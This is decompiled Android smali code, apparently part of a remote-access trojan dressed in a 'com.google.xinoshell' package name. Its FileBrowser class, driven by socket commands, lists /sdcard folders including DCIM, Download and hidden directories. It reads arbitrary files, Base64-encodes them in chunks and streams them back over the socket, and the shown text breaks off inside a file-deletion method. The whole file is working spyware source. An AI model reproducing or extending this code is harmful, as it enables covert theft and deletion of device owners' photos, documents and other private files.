.class public Lcom/google/xinoshell/utils/FileBrowser;
.super Ljava/lang/Object;
.source "FileBrowser.java"


# instance fields
.field private final mContext:Landroid/content/Context;

.field private final manageSocket:Lcom/google/xinoshell/connection/ManageSocket;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/google/xinoshell/connection/ManageSocket;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "manageSocket"    # Lcom/google/xinoshell/connection/ManageSocket;

    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 12
    iput-object p1, p0, Lcom/google/xinoshell/utils/FileBrowser;->mContext:Landroid/content/Context;

    .line 13
    iput-object p2, p0, Lcom/google/xinoshell/utils/FileBrowser;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    .line 14
    return-void
.end method

.method public listFiles(Ljava/lang/String;Ljava/lang/String;)V
    .locals 11
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "socketId"    # Ljava/lang/String;

    :try_start_0
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 21
    .local v0, "jsonArray":Lorg/json/JSONArray;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 22
    .local v1, "dir":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    goto :cond_0

    .line 23
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 24
    .local v2, "err":Lorg/json/JSONObject;
    const-string v3, "socketId"

    invoke-virtual {v2, v3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 25
    const-string v3, "path"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 26
    const-string v3, "error"

    const-string v4, "Path not found"

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 27
    const-string v3, "file_list_result"

    invoke-direct {p0, v3, v2}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 28
    goto :goto_end

    .line 31
    :cond_0
    invoke-virtual {v1}, Ljava/io/File;->isDirectory()Z

    move-result v2

    if-nez v2, :cond_1

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 32
    .local v2, "single":Lorg/json/JSONObject;
    const-string v3, "socketId"

    invoke-virtual {v2, v3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 33
    const-string v3, "path"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 34
    const-string v3, "files"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 35
    const-string v3, "file_list_result"

    invoke-direct {p0, v3, v2}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 36
    goto :goto_end

    .line 39
    :cond_1
    invoke-virtual {v1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    .line 40
    .local v1, "files":[Ljava/io/File;
    if-eqz v1, :cond_3

    array-length v2, v1

    if-lez v2, :cond_3

    .line 41
    array-length v7, v1

    const/4 v8, 0x0

    :goto_0
    if-ge v8, v7, :cond_3

    aget-object v2, v1, v8

    .line 42
    .local v2, "f":Ljava/io/File;
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 43
    .local v3, "item":Lorg/json/JSONObject;
    const-string v4, "name"

    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 44
    const-string v4, "size"

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v5

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 45
    const-string v4, "isDir"

    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 46
    const-string v4, "modified"

    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v5

    invoke-virtual {v3, v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 47
    const-string v4, "type"

    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-direct {p0, v5}, Lcom/google/xinoshell/utils/FileBrowser;->guessType(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 48
    invoke-virtual {v0, v3}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 41
    .end local v2    # "f":Ljava/io/File;
    .end local v3    # "item":Lorg/json/JSONObject;
    add-int/lit8 v8, v8, 0x1

    goto :goto_0

    .line 58
    :cond_3
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 59
    .local v2, "out":Lorg/json/JSONObject;
    const-string v3, "socketId"

    invoke-virtual {v2, v3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 60
    const-string v3, "path"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 61
    const-string v3, "files"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 62
    const-string v3, "file_list_result"

    invoke-direct {p0, v3, v2}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 64
    nop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_end

    .line 67
    :catch_0
    move-exception v0

    .line 68
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "FileBrowser"

    const-string v2, "listFiles error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 69
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 70
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 71
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 72
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 73
    const-string v2, "file_list_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 75
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end
    return-void
.end method

.method public readFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 13
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "socketId"    # Ljava/lang/String;

    .line 81
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 82
    .local v0, "f":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->getCanonicalPath()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v0, v6

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_0

    .line 83
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 84
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 85
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 86
    const-string v2, "error"

    const-string v3, "File not found"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 87
    const-string v2, "file_data"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 88
    goto :goto_end

    .line 92
    :cond_0
    new-instance v1, Ljava/io/FileInputStream;

    invoke-direct {v1, v0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 93
    .local v1, "fis":Ljava/io/FileInputStream;
    const v2, 0x8000

    new-array v3, v2, [B

    .line 94
    .local v3, "buf":[B
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v4

    .line 95
    .local v4, "fileSize":J
    const-wide v10, 0x8000L

    div-long v6, v4, v10

    .line 96
    .local v6, "totalChunks":J
    rem-long v8, v4, v10

    const-wide/16 v4, 0x0L

    cmp-long v8, v8, v4

    if-lez v8, :cond_1

    const-wide/16 v8, 0x1L

    add-long/2addr v6, v8

    .line 97
    :cond_1
    long-to-int v8, v6

    .line 98
    .local v8, "totalChunksInt":I
    const/4 v9, 0x0

    .line 99
    .local v9, "chunkIndex":I
    :goto_0
    invoke-virtual {v1, v3}, Ljava/io/FileInputStream;->read([B)I

    move-result v10

    if-lez v10, :cond_2

    .line 100
    new-instance v11, Lorg/json/JSONObject;

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    .line 101
    .local v11, "out":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v11, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 102
    const-string v2, "path"

    invoke-virtual {v11, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 103
    const-string v2, "chunk"

    invoke-virtual {v11, v2, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 104
    const-string v2, "totalChunks"

    invoke-virtual {v11, v2, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 105
    const-string v2, "data"

    const/4 v5, 0x0

    invoke-static {v3, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v11, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 106
    const-string v2, "file_data"

    invoke-direct {p0, v2, v11}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 107
    add-int/lit8 v9, v9, 0x1

    goto :goto_0

    .line 110
    :cond_2
    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_end

    .line 113
    :catch_0
    move-exception v0

    .line 114
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "FileBrowser"

    const-string v2, "readFile error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 115
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 116
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 117
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 118
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 119
    const-string v2, "file_data"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 121
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end
    return-void
.end method


# virtual methods
.method private emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 1
    .param p1, "event"    # Ljava/lang/String;
    .param p2, "data"    # Lorg/json/JSONObject;

    .line 127
    iget-object v0, p0, Lcom/google/xinoshell/utils/FileBrowser;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0, p1, p2}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 128
    return-void
.end method

.method private guessType(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "name"    # Ljava/lang/String;

    .line 132
    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 133
    .local v0, "low":Ljava/lang/String;
    const-string v1, ".jpg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, ".jpeg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, ".png"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, ".gif"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, ".webp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, ".bmp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 134
    :cond_0
    const-string v1, "image"

    return-object v1

    .line 135
    :cond_8
    const-string v1, ".mp4"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_9

    const-string v1, ".mkv"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_9

    const-string v1, ".avi"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_9

    const-string v1, ".mov"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_9

    const-string v1, ".3gp"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 136
    :cond_9
    const-string v1, "video"

    return-object v1

    .line 137
    :cond_1
    const-string v1, ".mp3"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".wav"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".aac"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".ogg"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".m4a"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_2

    const-string v1, ".flac"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 138
    :cond_2
    const-string v1, "audio"

    return-object v1

    .line 139
    :cond_3
    const-string v1, ".pdf"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".doc"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".docx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".txt"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".xls"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".xlsx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".ppt"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".pptx"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, ".csv"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 140
    :cond_4
    const-string v1, "document"

    return-object v1

    .line 141
    :cond_5
    const-string v1, ".apk"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, ".zip"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, ".rar"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, ".tar"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, ".gz"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    const-string v1, ".7z"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_7

    .line 142
    :cond_6
    const-string v1, "archive"

    return-object v1

    .line 143
    :cond_7
    const-string v1, "file"

    return-object v1
.end method

.method public resolvePath(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p1, "source"    # Ljava/lang/String;
    .param p2, "subPath"    # Ljava/lang/String;

    .line 149
    const-string v0, "/sdcard"

    .line 151
    .local v0, "root":Ljava/lang/String;
    const-string v1, "gallery"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3

    const-string v1, "files"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    .line 157
    :cond_0
    const-string v1, "hidden"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 158
    const-string v0, "/sdcard"

    .line 160
    :cond_1
    if-nez p2, :cond_2

    const-string p2, ""

    .line 161
    :cond_2
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1

    .line 152
    :cond_3
    :goto_0
    if-nez p2, :cond_4

    const-string p2, ""

    .line 153
    :cond_4
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "/sdcard/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "gallery"

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    const-string v2, "DCIM"

    goto :goto_1

    :cond_5
    const-string v2, "Download"

    :goto_1
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public listHidden(Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "socketId"    # Ljava/lang/String;

    .line 170
    :try_start_0
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 171
    .local v0, "jsonArray":Lorg/json/JSONArray;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 172
    .local v1, "dir":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v1

    .line 173
    .local v1, "files":[Ljava/io/File;
    if-eqz v1, :cond_0

    array-length v2, v1

    if-lez v2, :cond_0

    .line 174
    array-length v2, v1

    const/4 v3, 0x0

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_0

    aget-object v5, v1, v4

    .line 175
    .local v5, "f":Ljava/io/File;
    invoke-virtual {v5}, Ljava/io/File;->isDirectory()Z

    move-result v6

    if-eqz v6, :cond_no_hidden

    invoke-virtual {v5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    const-string v7, "."

    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_no_hidden

    .line 176
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 177
    .local v6, "item":Lorg/json/JSONObject;
    const-string v7, "name"

    invoke-virtual {v5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 178
    const-string v7, "isDir"

    const/4 v8, 0x1

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 179
    const-string v7, "modified"

    invoke-virtual {v5}, Ljava/io/File;->lastModified()J

    move-result-wide v10

    invoke-virtual {v6, v7, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 180
    const-string v7, "type"

    const-string v8, "hidden"

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 181
    invoke-virtual {v0, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 174
    .end local v5    # "f":Ljava/io/File;
    .end local v6    # "item":Lorg/json/JSONObject;
    :cond_no_hidden
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 185
    :cond_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 186
    .local v2, "out":Lorg/json/JSONObject;
    const-string v3, "socketId"

    invoke-virtual {v2, v3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 187
    const-string v3, "path"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 188
    const-string v3, "files"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 189
    const-string v3, "file_list_result"

    invoke-direct {p0, v3, v2}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_end

    .line 192
    :catch_0
    move-exception v0

    .line 193
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "FileBrowser"

    const-string v2, "listHidden error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 194
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 195
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 196
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 197
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 198
    const-string v2, "file_list_result"

    invoke-direct {p0, v2, v1}, Lcom/google/xinoshell/utils/FileBrowser;->emitToSocket(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 200
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end
    return-void
.end method

.method public deleteFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "socketId"    # Ljava/lang/String;

    .line 220
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 221
    .local v0, "f":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->getCanonicalPath()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v0, v4

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_missing

    .line 223
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 224
    .local v1, "out":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 225
    const-string v2, "path"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 226
    const-string v2, "deleted"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 227
    const-string v2, "error"

    const-string v3, "File not found"

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

